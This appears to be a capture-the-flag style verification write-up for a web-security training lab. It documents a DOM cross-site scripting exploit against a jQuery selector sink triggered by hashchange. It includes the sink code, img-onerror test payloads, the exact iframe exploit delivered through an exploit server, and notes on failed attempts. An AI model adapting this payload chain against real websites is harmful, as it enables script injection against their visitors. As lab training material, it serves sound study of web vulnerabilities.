# Verification — DOM XSS in jQuery selector sink (hashchange)

## Methodology
1. Static review (curl): read the inline handler; identify source (`location.hash`),
   transform (`slice(1)` + `decodeURIComponent`), sink (`$(…:contains(…))`), gate
   (`hashchange`), stack (jQuery 1.8.2 + Migrate).
2. Official objective retrieved (lab page): victim-delivered `print()` via exploit server.
3. Empirical mechanism tests in CDP-driven Chromium (no guessing at jQuery internals):
   direct selector eval, hash-change execution, cold-load gating.
4. Exploit-server flow: STORE → VIEW (verify served bytes) → DELIVER → access-log +
   banner polls.
5. Failure analysis for every broken step (including an operational self-inflicted one).

## Evidence

### 1. Sink code (curl, home page)
```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

### 2. Direct selector behavior (CDP Runtime.evaluate)
```
$('section.blog-list h2:contains(<img src=x onerror=void(0)>)')
→ 'OK len=1', no exception
```
Meaning: jQuery routed the string to fragment construction (HTML-sniff hit) and
returned the created element. (Had it gone to Sizzle, it would have thrown
"unrecognized expression".)

### 3. Hash-change execution (CDP)
```
location.hash = '#<img src=x onerror="document.title=\'HCMARK\'">'
→ title after hashchange: HCMARK ; page errors: []
```
The detached img's `onerror` fired with zero exceptions. (Browser percent-encodes the
fragment in `location.hash` — `%3Cimg%20…` — and the sink's `decodeURIComponent`
restores it; the round-trip is part of the verified chain.)

### 4. Gating proof — cold load does NOT trigger (fresh CDP target)
```
Page.navigate (fresh target) → /#<img src=x onerror="document.title='COLDLOAD'">
→ title UNCHANGED ; hash present but handler never ran
```
Versus same-document fragment navigation (previous test) → executes. This pair is WHY
victim delivery must manufacture a change (iframe `#` → `#payload`), and why a plain
crafted link to `/#payload` would fail.

### 5. Exploit-server flow (curl form API)
- STORE (`formAction=STORE`, full head+body) → 200; `GET /exploit` serves the iframe
  byte-verbatim.
- DELIVER (`formAction=DELIVER_TO_VICTIM`) → 302 → `/deliver-to-victim`.
- Access log (`GET /log`): `GET /exploit/ … "Mozilla/5.0 (Victim)…Chrome/151.0.0.0…"` —
  victim visit confirmed.
- Lab banner: `is-notsolved` → `is-solved`.

### 6. Stored exploit body (exact)
```html
<iframe src="https://0ae90061041f5f8780298f82002700a3.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### 7. Failed-candidate / failure analysis
| Attempt / event | Result | Why / lesson |
|---|---|---|
| Assuming Sizzle throw (theory) | disproven empirically | jQuery 1.8 HTML-sniff matches `<…>` mid-string; test the actual build, don't reason from docs memory |
| Cold navigation to `/#payload` | no execution | no `hashchange` on initial load — event-gated sinks need a change trigger |
| First DELIVER with dummy head/body (`x`) | 400 "Invalid response: Empty response" | server validates the stored response; delivery requests must carry the full valid head+body |
| ACCESS_LOG POSTs carrying `responseBody=x` | **silently overwrote `/exploit` with `x`** | the exploit server persists the posted body on (apparently) any form POST — never send placeholder bodies; always re-verify `GET /exploit` after any POST before delivering |
| Victim not visiting for ~2 min (first round) | caused by the overwrite above, not victim latency | check the served bytes first when delivery seems dead; access log distinguishes "victim idle" from "exploit broken" |
| `<script>`-in-hash idea | not applicable | sink is `$()`, not a markup parser — payload must be an HTML *fragment jQuery will construct*, with an auto-firing resource handler; script elements constructed by jQuery DO execute on insertion but nothing inserts here — detached `img onerror` is the correct primitive |

## Reproducibility
```
# 1. mechanism (CDP): navigate to lab home, Runtime.evaluate the direct-selector
#    probe and the location.hash assignment; assert title change + no errors.
# 2. gating (CDP): Target.createTarget(about:blank) → navigate cold to /#payload →
#    assert title UNCHANGED.
# 3. delivery (curl): STORE full body → GET /exploit (byte check) →
#    DELIVER_TO_VICTIM → GET /log (victim UA) → poll lab banner.
```

## Confirmation criteria
- CONFIRMED: selector→fragment routing (len=1, no throw), detached-onerror execution,
  cold-load gating, stored-bytes integrity, victim visit, `is-solved`.
- The operational overwrite incident is recorded as a verified exploit-server behavior,
  not a lab vulnerability.